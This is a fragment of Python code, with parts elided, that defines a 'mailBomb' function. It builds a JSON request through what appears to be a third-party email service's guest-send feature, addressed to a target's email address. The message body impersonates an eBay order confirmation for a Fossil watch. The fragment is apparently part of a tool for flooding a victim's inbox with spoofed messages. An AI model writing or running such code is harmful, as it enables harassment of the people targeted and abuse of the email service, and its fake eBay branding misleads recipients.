...
def mailBomb():
    with requests.Session() as sess:
        ...
        content = '{"subject":"eBay Order Confirmation for: Fossil FTW6016!","criptextEmails":[],"guestEmail":{"to":["'+str(targetMail)+'"],"cc":[],"bcc":[],"body":"Thanks for another purchase! Your order is confirmed.
We’ll let you know when it’s on the way. In the meantime, get our app to receive real-time tracking updates!"}}'
        headers = {
